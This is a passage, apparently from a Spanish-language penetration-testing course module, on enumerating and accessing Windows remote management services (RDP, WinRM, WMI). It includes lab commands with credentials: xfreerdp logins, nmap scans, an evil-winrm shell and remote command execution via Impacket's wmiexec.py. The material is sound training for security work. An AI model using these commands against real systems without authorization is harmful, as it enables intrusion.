[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE

[+] Summary of security issues


rdp-sec-check v0.9-beta completed at Sun Nov  7 16:50:33 2021
```

La autenticación y la conexión a dichos servidores RDP se pueden realizar de varias maneras. Por ejemplo, podemos conectarnos a servidores RDP en Linux usando `xfreerdp`, `rdesktop`, o `Remmina` e interactuar con la GUI del servidor en consecuencia.

#### Iniciar una sesión de RDP

  Protocolos de administración remota de Windows

```shell-session
vcrdcr@htb[/htb]$ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248

[16:37:47:135] [95319:95320] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[16:37:47:447] [95319:95320] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[16:37:47:453] [95319:95320] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[16:37:47:453] [95319:95320] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - creating directory /home/cry0l1t3/.config/freerdp
[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - creating directory [/home/cry0l1t3/.config/freerdp/certs]
[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - created directory [/home/cry0l1t3/.config/freerdp/server]
[16:37:47:599] [95319:95320] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[16:37:47:599] [95319:95320] [WARN][com.freerdp.crypto] - CN = ILF-SQL-01
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.201.248:3389) 
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - Common Name (CN):
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] -      ILF-SQL-01
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.201.248:3389 (RDP-Server):
        Common Name: ILF-SQL-01
        Subject:     CN = ILF-SQL-01
        Issuer:      CN = ILF-SQL-01
        Thumbprint:  b7:5f:00:ca:91:00:0a:29:0c:b5:14:21:f3:b0:ca:9e:af:8c:62:d6:dc:f9:50:ec:ac:06:38:1f:c5:d6:a9:39
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.


Do you trust the above certificate? (Y/T/N) y

[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] - VERSION ={
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductMajorVersion: 6
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductMinorVersion: 1
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductBuild: 7601
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      Reserved: 0x000000
```

Después de una autenticación exitosa, aparecerá una nueva ventana con acceso al escritorio del servidor al que nos hemos conectado.

---

## WinRM

La Administración remota de Windows (`WinRM`) es un protocolo de administración remota integrado de Windows simple basado en la línea de comandos. WinRM utiliza el Simple Object Access Protocol (`SOAP`) para establecer conexiones a hosts remotos y sus aplicaciones. Por lo tanto, WinRM debe estar explícitamente habilitado y configurado a partir de Windows 10. WinRM confía en `TCP` puertos `5985` y `5986` para la comunicación, con el último puerto `5986 using HTTPS`, ya que los puertos 80 y 443 se usaron previamente para esta tarea. Sin embargo, dado que el puerto 80 fue bloqueado principalmente por razones de seguridad, los puertos más nuevos 5985 y 5986 se utilizan hoy en día.

Otro componente que se ajusta a WinRM para la administración es Windows Remote Shell (`WinRS`), que nos permite ejecutar comandos arbitrarios en el sistema remoto. El programa incluso se incluye en Windows 7 de forma predeterminada. Por lo tanto, con WinRM, es posible ejecutar un comando remoto en otro servidor.

Los servicios como las sesiones remotas que utilizan PowerShell y la fusión de registros de eventos requieren WinRM. Está habilitado de forma predeterminada comenzando con el `Windows Server 2012` versión, pero primero debe configurarse para versiones de servidor y clientes anteriores, y se crean las excepciones de firewall necesarias.

---

## Huella del Servicio

Como ya sabemos, WinRM utiliza puertos TCP `5985` (`HTTP`) y `5986` (`HTTPS`) de forma predeterminada, que podemos escanear usando Nmap. Sin embargo, a menudo veremos que solo HTTP (`TCP 5985`) se utiliza en lugar de HTTPS (`TCP 5986`).

#### WinRM Nmap

  Protocolos de administración remota de Windows

```shell-session
vcrdcr@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:31 CET
Nmap scan report for 10.129.201.248
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

Si queremos saber si se puede llegar a uno o más servidores remotos a través de WinRM, podemos hacerlo fácilmente con la ayuda de PowerShell. El [Prueba-WsMan](https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2) cmdlet es responsable de esto, y se le pasa el nombre del anfitrión en cuestión. En entornos basados en Linux, podemos usar la herramienta llamada [malvado-winrm](https://github.com/Hackplayers/evil-winrm), otra herramienta de prueba de penetración diseñada para interactuar con WinRM.

  Protocolos de administración remota de Windows

```shell-session
vcrdcr@htb[/htb]$ evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Cry0l1t3\Documents>
```

---

## WMI

Instrumentación de administración de Windows (`WMI`) es la implementación de Microsoft y también una extensión del Modelo de Información Común (`CIM`), funcionalidad básica de la Gestión Empresarial Basada en la Web estandarizada (`WBEM`) para la plataforma Windows. WMI permite el acceso de lectura y escritura a casi todas las configuraciones en los sistemas Windows. Comprensiblemente, esto lo convierte en la interfaz más crítica en el entorno de Windows para la administración y el mantenimiento remoto de computadoras con Windows, independientemente de si son PC o servidores. Por lo general, se accede a WMI a través de PowerShell, VBScript o Windows Management Instrumentation Console (`WMIC`). WMI no es un solo programa, sino que consta de varios programas y varias bases de datos, también conocidas como repositorios.

---

## Huella del Servicio

La inicialización de la comunicación WMI siempre tiene lugar en `TCP` puerto `135`, y después del establecimiento exitoso de la conexión, la comunicación se mueve a un puerto aleatorio. Por ejemplo, el programa [wmiexec.p](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) desde el kit de herramientas Impacket se puede utilizar para esto.

#### WMIexec.p

  Protocolos de administración remota de Windows

```shell-session
vcrdcr@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
ILF-SQL-01
```

Una vez más, es necesario mencionar que el conocimiento adquirido al instalar estos servicios y jugar con las configuraciones en nuestra propia VM de Windows Server para adquirir experiencia y desarrollar el principio funcional y el punto de vista del administrador no puede ser reemplazado por la lectura de manuales. Por lo tanto, recomendamos encarecidamente configurar su propio servidor Windows, experimentar con la configuración y escanear estos servicios repetidamente para ver las diferencias en los resultados.